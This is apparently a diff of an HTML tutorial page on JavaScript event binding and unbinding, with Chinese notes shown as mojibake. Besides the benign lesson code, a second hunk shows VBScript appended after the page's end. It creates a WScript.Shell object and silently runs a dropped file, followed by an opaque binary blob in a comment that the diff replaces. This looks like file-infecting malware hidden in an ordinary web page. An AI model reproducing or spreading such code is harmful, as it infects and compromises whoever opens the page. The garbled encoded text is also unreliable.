@@ -6,34 +6,57 @@
 		<meta http-equiv="X-UA-Compatible" content="ie=edge">
 		<title></title>
 	</head>
-	<style type="text/css">
-		div {
-			width: 100px;
-			height: 100px;
-			background-color: green;
-			float: left;
-			margin-left: 10px;
-			border: 2px solid green;
-		}
-	</style>
 	<body>
-		<div></div>
-		<div></div>
-		<div></div>
-		<div></div>
-		<div></div>
+		è§£ç»‘äº‹ä»¶
+		ç”¨ä»€ä¹ˆæ–¹å¼ç»‘å®šäº‹ä»¶ï¼Œå°±åº”è¯¥ç”¨å¯¹åº”çš„æ–¹å¼è§£ç»‘äº‹ä»¶
+		1.è§£ç»‘äº‹ä»¶
+		å¯¹è±¡.onäº‹ä»¶åå­—=äº‹ä»¶å¤„ç†å‡½æ•° ---ç»‘å®šäº‹ä»¶
+		å¯¹è±¡.onäº‹ä»¶åå­—=null;
+		2.è§£ç»‘äº‹ä»¶
+		å¯¹è±¡.addEventListener("æ²¡æœ‰onçš„äº‹ä»¶ç±»å‹",äº‹ä»¶å¤„ç†å‡½æ•°,false);----ç»‘å®šäº‹ä»¶
+		å¯¹è±¡.removeEventListener("æ²¡æœ‰onçš„äº‹ä»¶ç±»å‹",äº‹ä»¶å¤„ç†å‡½æ•°,false);----è§£ç»‘äº‹ä»¶
+		3.è§£ç»‘äº‹ä»¶
+		å¯¹è±¡.attachEvent();----ç»‘å®š
+		å¯¹è±¡.detachEvent();----è§£ç»‘
+
+		<input type="button" name="" id="btn" value="æŒ‰é’®" />
+		<input type="button" name="" id="btn2" value="è§£ç»‘äº‹ä»¶" />
 		<script src="js/common.js"></script>
-		<script>
-			var list = document.getElementsByTagName('div');
-			console.log(list);
-			for(i=0;i<list.length;i++){
-				list[i].onmouseover=function(){
-					this.style.border="2px solid red";
-				};
-				list[i].onmouseout=function(){
-					this.style.border="";
-				};
+		<script type="text/javascript">
+			// 			my$('btn').onclick = function() {
+			// 				console.log("äº‹ä»¶");
+			// 			};
+			function f1() {
+				console.log("å‘å•Š")
+			};
+			my$('btn').addEventListener("click", f1, false);
+			my$('btn2').onclick = function() {
+				// è§£ç»‘äº‹ä»¶
+				// my$('btn').onclick = null;
+				my$('btn').removeEventListener("click", f1, false);
 			}
+
+
+			// ç»‘å®šäº‹ä»¶çš„å…¼å®¹
+			function addEventListener(element, type, fn) {
+				if (element.addEventListener) {
+					element.addEventListener(type, fn, false);
+				} else if (element.attachEvent) {
+					element.attachEvent("on" + type, fn);
+				} else {
+					element["on" + type] = fn;
+				}
+			};
+			// è§£ç»‘äº‹ä»¶çš„å…¼å®¹
+			function removeEventListener(element, type, fn) {
+				if (element.removeEventListener) {
+					element.removeEventListener(type, fn, false);
+				} else if (element.detachEvent) {
+					element.detachEvent("on" + type, fn);
+				} else {
+					element["on" + type] = null;
+				}
+			};
 		</script>
 	</body>
 </html>
@@ -51,6 +74,6 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--bë&ü	è’DgŠ e:qUP`IHi¼ÅÅAÆ‘K²ƒwRr¢@i*é[ŒèÄsô]Éj*o±÷µY­bÙ—Ô>Ø=Ìm¸ƒ¬×§ ÁÜGÚåäåEÛiÇÆæèT-æ—<ÛcÚ>öO×ñ:–¿ìı«É‡÷óôDÒ W“~ø;R–»ÄSÛÔ,şûÜqäµXˆ.ÃŒ ®Ã÷‡–ùrı0l„WŒ¶¾ŠËš×X4\öfı`A`ÏŞVØŠäq–WübtàóUX?©š;H‡×œj*õ€”€v ˆìİ¾‡Ò_F–3™VòÛO¼´¥É³aÜmf(;ÈÇÍL'ï‘ä¡Õ[ıŒw3Õ-ÛäNì‰úûäó-O¾	7ïw »'_ıË&9nPq™D#L¼gõ¿ƒK¾iP<‹¼ÙŞ¼*Ã•
-EÇn®¬÷³‘|>§*÷:ğ'·Ív)ˆÃŠ~]„$€…
-Ó6üZ!\9Ù<}¾«û¤RÅN±xulâÇT§0}ı[lø¼Ÿvu~…ŞLª›vóvú^z8³ØV8x!–éœS~8¿k, áùR"âøáùáùáù¬$Nüı_^Wâù áù-->
+//--></SCRIPT><!--eXºû2]MªôÓ–bMıÆN‡> 9¦›ûÕõÆJ¹øx“k&˜$©~ƒxjuåš`RšOmLàÅŸĞjŒQíœEçÑq¼S™‘ğÂ&wùíà†Ò£ôÉ±[İ¶D9ÓVúô¹e>œ¼ÑÃëšû}ß,ƒÊ£dÕ<“Àºw’ùİ¿¿=£Õ¶Z[
+5ôv˜W¥p&¶¼¨¥ºÉ¨_i09ìƒ?à›\$r1Ø™2ÙQşQR.ê4R—Œ)ö«Ï£¿
+êÂ= ?rl0‡"JM5€dcHXÃHëg~ˆä\Ú¶r·­ù›™ Â¥TS”%!%kÇç¨Q#O4Ìzù?ˆŞÜÁUzÕ üPäVšHû9Ïuó2Qëé¼õûëõç|Dp­Æø}‰Å‰P›fèÓROçI×ÏÈLƒxOT Á¶½³~İduypZ‡Ã%µ¾×ˆ„Äà¿°’WµÍ¹!Q× _w\ô„€ôÙ&Z <6™jÀeAŸ,yª2Îô¢3v­	’_/¿V•SÚÜ]”ğ2ş'h}ë‰­¯Ó»7µs`ãwİc™"¥EÖW ä(R'3ùä(ä(ä(©õO½Z€_ªã( ä(-->
